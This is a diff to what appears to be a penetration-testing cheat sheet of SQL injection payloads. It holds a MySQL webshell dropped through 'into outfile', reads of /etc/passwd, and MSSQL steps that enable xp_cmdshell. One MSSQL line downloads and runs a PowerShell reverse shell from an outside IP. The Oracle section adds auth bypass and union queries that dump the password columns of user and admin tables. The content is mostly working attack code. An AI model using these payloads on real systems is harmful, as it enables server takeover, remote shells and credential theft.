@@ -800,7 +800,7 @@ https://site.com/upload/ok.jpg.php?ok=whoami
 -> Scientifc Notation;  
 -> hexadecimal, substr, etc...  
   
-### Webshell via SQLI
+### Webshell via SQLI - MySQL
 ```
 LOAD_FILE('/etc/httpd/conf/httpd.conf')    
 select "<?php system($_GET['cmd']);?>" into outfile "/var/www/html/shell.php";
@@ -812,10 +812,39 @@ e.g
 SELECT LOAD_FILE('/etc/passwd')
 ```
 
-### RCE via SQLI - MSSQL
-e.g  
+### MSSQL Injection
+
+-> Bypass Authentication
 ```
-EXEC xp_cmdshell 'powershell -c iwr http://site.com/$(whoami)';--
+' or 1=1--
+```
+
+-> Enable xp_cmdshell
+```
+' UNION SELECT 1, null; EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;--
+```
+
+-> RCE
+```
+' exec xp_cmdshell "powershell IEX (New-Object Net.WebClient).DownloadString('http://192.168.119.147/InvokePowerShellTcp.ps1')" ;--
+```
+https://raw.githubusercontent.com/samratashok/nishang/master/Shells/Invoke-PowerShellTcp.ps1
+
+### Oracle SQL
+
+-> Bypass Authentication
+```
+' or 1=1--
+```
+
+-> Exploiting
+```
+' order by 3--
+' union select null,table_name,null from all_tables--
+' union select null,column_name,null from all_tab_columns where table_name='WEB_USERS'--
+' union select null,column_name,null from all_tab_columns where table_name='WEB_ADMINS'--
+' union select null,PASSWORD||USER_ID||USER_NAME,null from WEB_USERS--
+' union select null,PASSWORD,null from WEB_ADMINS--
 ```
 
 ### Scripts Example
